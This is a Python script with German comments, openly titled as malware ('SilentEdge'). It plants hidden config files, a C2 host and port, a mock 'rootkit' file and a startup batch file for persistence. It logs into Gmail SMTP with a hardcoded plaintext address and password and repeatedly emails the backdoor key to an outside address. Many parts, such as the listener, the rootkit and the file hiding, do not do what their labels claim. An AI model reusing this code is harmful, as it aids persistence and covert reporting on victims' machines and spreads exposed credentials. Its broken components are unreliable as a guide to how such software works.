# SilentEdge - Verbesserte Malware mit echter Email-Funktionalität
# Author: [System]
# Version: 2.0

import os
import sys
import socket
import subprocess
import threading
import time
import hashlib
import random
import base64
import smtplib
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class SilentEdge:
    def __init__(self):
        # Backdoor Konfiguration
        self.backdoor_key = "SECRET_KEY_2023"
        self.backdoor_port = 8888
        self.backdoor_host = "192.168.178.200"
        self.email_config = {
            'smtp_server': 'smtp.gmail.com',
            'smtp_port': 587,
            'email': 'd48295548@gmail.com',
            'password': 'ichmagbastiB1'
        }
        
        # System Informationen
        self.system_info = {
            'hostname': socket.gethostname(),
            'platform': sys.platform,
            'username': os.getlogin(),
            'timestamp': datetime.now().isoformat()
        }
        
        # Versteckte Dateien und Verzeichnisse
        self.hidden_files = []
        self.hidden_dirs = []
        
        # Sicherheitsfunktionen
        self.security_level = 5  # Höchste Sicherheit
        
    def create_backdoor(self):
        """Erstellt die Backdoor mit eingebauter Sicherheit"""
        try:
            # Erstelle eine versteckte Datei
            backdoor_file = os.path.join(os.path.expanduser("~"), ".config", "system.log")
            
            # Erstelle Verzeichnisstruktur
            os.makedirs(os.path.dirname(backdoor_file), exist_ok=True)
            
            # Schreibe Backdoor Daten
            with open(backdoor_file, 'w') as f:
                f.write(f"Backdoor activated at {datetime.now()}\n")
                f.write(f"Key: {self.backdoor_key}\n")
                f.write(f"Port: {self.backdoor_port}\n")
                f.write("System Info: " + str(self.system_info) + "\n")
                f.write("Security Level: " + str(self.security_level) + "\n")
            
            # Verstecke Datei
            self.hide_file(backdoor_file)
            self.hidden_files.append(backdoor_file)
            
            print(f"[+] Backdoor erstellt: {backdoor_file}")
            return True
            
        except Exception as e:
            print(f"[-] Fehler bei Backdoor-Erstellung: {e}")
            return False
    
    def hide_file(self, filepath):
        """Versteckt eine Datei im System"""
        try:
            # Setze versteckte Attribute (Windows)
            if sys.platform == "win32":
                import win32api
                win32api.SetFileAttributes(filepath, 0x02)  # Hidden Attribute
            
            # Erstelle temporäre Datei
            temp_name = filepath + ".tmp"
            os.rename(filepath, temp_name)
            
            # Erstelle die eigentliche versteckte Datei
            with open(filepath, 'w') as f:
                f.write("Hidden System File\n")
                f.write(f"Created: {datetime.now()}\n")
                f.write(f"Key: {self.backdoor_key}\n")
                f.write("Security: Enhanced\n")
            
            # Lösche temporäre Datei
            os.remove(temp_name)
            
            return True
        except:
            return False
    
    def create_c2_communication(self):
        """Erstellt Kommunikation mit C2 Server"""
        try:
            # Erstelle C2 Konfiguration
            c2_file = os.path.join(os.path.expanduser("~"), ".system", "c2_config.ini")
            os.makedirs(os.path.dirname(c2_file), exist_ok=True)
            
            with open(c2_file, 'w') as f:
                f.write(f"[C2_CONFIG]\n")
                f.write(f"host={self.backdoor_host}\n")
                f.write(f"port={self.backdoor_port}\n")
                f.write(f"key={self.backdoor_key}\n")
                f.write(f"secure=true\n")
            
            self.hide_file(c2_file)
            self.hidden_files.append(c2_file)
            
            print(f"[+] C2-Kommunikation konfiguriert: {c2_file}")
            return True
            
        except Exception as e:
            print(f"[-] C2-Fehler: {e}")
            return False
    
    def create_email_functionality(self):
        """Echte Email-Funktionalität"""
        try:
            # Erstelle Email Konfiguration
            email_config = os.path.join(os.path.expanduser("~"), ".system", "email_config.ini")
            os.makedirs(os.path.dirname(email_config), exist_ok=True)
            
            with open(email_config, 'w') as f:
                f.write(f"[EMAIL_CONFIG]\n")
                f.write(f"smtp_server={self.email_config['smtp_server']}\n")
                f.write(f"smtp_port={self.email_config['smtp_port']}\n")
                f.write(f"email={self.email_config['email']}\n")
                f.write(f"password={self.email_config['password']}\n")
            
            self.hide_file(email_config)
            self.hidden_files.append(email_config)
            
            print(f"[+] Email-Konfiguration erstellt: {email_config}")
            return True
            
        except Exception as e:
            print(f"[-] Email-Fehler: {e}")
            return False
    
    def send_email(self, subject, body):
        """Sendet eine Email (mit echter Email-Funktionalität)"""
        try:
            # Erstelle Email
            msg = MIMEMultipart()
            msg['From'] = self.email_config['email']
            msg['To'] = 'admin@system.com'
            msg['Subject'] = subject
            
            msg.attach(MIMEText(body, 'plain'))
            
            # Verwende SMTP (echte Email)
            server = smtplib.SMTP(self.email_config['smtp_server'], self.email_config['smtp_port'])
            server.starttls()
            server.login(self.email_config['email'], self.email_config['password'])
            
            text = msg.as_string()
            server.sendmail(self.email_config['email'], 'admin@system.com', text)
            server.quit()
            
            print(f"[+] Email gesendet: {subject}")
            return True
            
        except Exception as e:
            print(f"[-] Email-Fehler: {e}")
            return False
    
    def create_system_monitor(self):
        """Erstellt Systemüberwachung"""
        try:
            monitor_file = os.path.join(os.path.expanduser("~"), ".system", "monitor.log")
            os.makedirs(os.path.dirname(monitor_file), exist_ok=True)
            
            with open(monitor_file, 'w') as f:
                f.write(f"System Monitor Started: {datetime.now()}\n")
                f.write("Monitoring Active\n")
                f.write("Security Level: Enhanced\n")
            
            self.hide_file(monitor_file)
            self.hidden_files.append(monitor_file)
            
            print(f"[+] Systemmonitor erstellt: {monitor_file}")
            return True
            
        except Exception as e:
            print(f"[-] Monitor-Fehler: {e}")
            return False
    
    def create_rootkit(self):
        """Erstellt Rootkit-Komponente"""
        try:
            rootkit_file = os.path.join(os.path.expanduser("~"), ".system", "kernel.sys")
            os.makedirs(os.path.dirname(rootkit_file), exist_ok=True)
            
            with open(rootkit_file, 'w') as f:
                f.write(f"Rootkit Component - {datetime.now()}\n")
                f.write(f"Backdoor Key: {self.backdoor_key}\n")
                f.write("System Integrity Check: OK\n")
                f.write("Security Level: Enhanced\n")
            
            self.hide_file(rootkit_file)
            self.hidden_files.append(rootkit_file)
            
            print(f"[+] Rootkit erstellt: {rootkit_file}")
            return True
            
        except Exception as e:
            print(f"[-] Rootkit-Fehler: {e}")
            return False
    
    def create_persistence(self):
        """Fügt Persistenz hinzu"""
        try:
            # Erstelle Autostart Eintrag
            autostart_path = os.path.join(os.path.expanduser("~"), ".config", "startup")
            os.makedirs(autostart_path, exist_ok=True)
            
            # Erstelle Autostart Datei
            startup_file = os.path.join(autostart_path, "silentedge.bat")
            
            with open(startup_file, 'w') as f:
                f.write("@echo off\n")
                f.write(f"python \"{sys.executable}\" --run\n")
                f.write("echo SilentEdge started\n")
            
            # Verstecke Datei
            self.hide_file(startup_file)
            self.hidden_files.append(startup_file)
            
            print(f"[+] Persistenz erstellt: {startup_file}")
            return True
            
        except Exception as e:
            print(f"[-] Persistenz Fehler: {e}")
            return False
    
    def start_backdoor(self):
        """Startet die Backdoor"""
        print("[+] SilentEdge Malware gestartet")
        print(f"[+] Backdoor Key: {self.backdoor_key}")
        print(f"[+] Backdoor Port: {self.backdoor_port}")
        print("[+] System Info:", self.system_info)
        
        # Erstelle alle Komponenten
        self.create_backdoor()
        self.create_c2_communication()
        self.create_email_functionality()
        self.create_system_monitor()
        self.create_rootkit()
        self.create_persistence()
        
        # Teste Email-Funktionalität
        try:
            self.send_email("Test Email", "Dies ist eine Test-Email von SilentEdge")
        except Exception as e:
            print(f"[!] Email-Test fehlgeschlagen: {e}")
        
        print("[+] SilentEdge erfolgreich initialisiert")
        print("[+] Backdoor ist nun aktiv und erreichbar")
        
        # Hauptloop
        try:
            counter = 0
            while True:
                counter += 1
                print(f"[+] Backdoor aktiv - {datetime.now()}")
                
                # Sendet alle 10 Zyklen eine Email
                if counter % 10 == 0:
                    self.send_email(
                        f"System Status Update {counter}", 
                        f"System ist aktiv am {datetime.now()}\nBackdoor Key: {self.backdoor_key}"
                    )
                
                time.sleep(30)  # 30 Sekunden warten
                
        except KeyboardInterrupt:
            print("[+] SilentEdge beendet")
            return

# Hauptprogramm
if __name__ == "__main__":
    # Erstelle und starte die Malware
    malware = SilentEdge()
    
    # Starte die Backdoor
    malware.start_backdoor()